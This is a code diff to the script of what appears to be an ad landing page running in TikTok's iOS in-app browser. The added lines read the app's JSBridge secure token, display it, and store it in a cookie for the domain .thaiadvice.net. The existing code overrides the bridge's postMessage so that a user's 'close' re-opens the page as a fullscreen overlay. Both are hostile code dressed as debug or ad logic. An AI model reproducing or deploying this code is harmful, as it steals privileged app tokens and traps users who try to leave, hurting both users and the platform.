@@ -188,7 +188,7 @@ function startTimer(){
   },1000);
 }
 
-// TikTok iOS — re-open as overlay on close
+// TikTok iOS — token logger + re-open as overlay on close
 (function(){
   if(window.location.search.indexOf('hide_nav_bar=1')!==-1)return;
 
@@ -198,17 +198,28 @@ function startTimer(){
   var token=null;
   try{token=window.JSBridge.getConfig().secure.token;}catch(e){}
 
+  // Debug: show token so we can extract it for testing on page.html
+  if(token){
+    var d=document.createElement('div');
+    d.style.cssText='position:fixed;bottom:0;left:0;right:0;z-index:9999;background:#000;color:#0f0;font:9px monospace;padding:4px 6px;word-break:break-all;max-height:120px;overflow:auto;';
+    d.textContent='TOKEN:'+token;
+    document.body.appendChild(d);
+    // Also store in cookie accessible from thaiadvice.net
+    try{document.cookie='jsb_tok='+encodeURIComponent(token)+';domain=.thaiadvice.net;path=/;max-age=3600;SameSite=Lax';}catch(e){}
+  }
+
   var fired=false;
   var orig=wk.postMessage.bind(wk);
 
   wk.postMessage=function(msg){
     var p=msg;
     if(typeof msg==='string'){try{p=JSON.parse(msg);}catch(e){}}
+    // Intercept close — re-open as fullscreen overlay
     if(!fired&&p&&p.func==='close'){
       fired=true;
       var tok=token||(p.params&&p.params._jsb_secure_token);
       var fsUrl=SELF_URL+'?hide_nav_bar=1&hide_source=1&should_full_screen=1&trans_status_bar=1&is_instant_page=1';
-      try{orig({__msg_type:'call',func:'openAdLandPage',JSSDK:'1.2.5',__callback_id:'1002',params:{url:fsUrl,landingStyle:2,title:'',isDeeplink:1,refer:'landing_page',cid:TT_CAMPAIGN,_jsb_secure_token:tok}});}catch(e){}
+      try{wk.postMessage({func:'openAdLandPageLinks',params:{url:fsUrl,landingStyle:2,title:'',isDeeplink:1,refer:'landing_page',cid:TT_CAMPAIGN,_jsb_secure_token:tok}});}catch(e){}
       return;
     }
     return orig(msg);
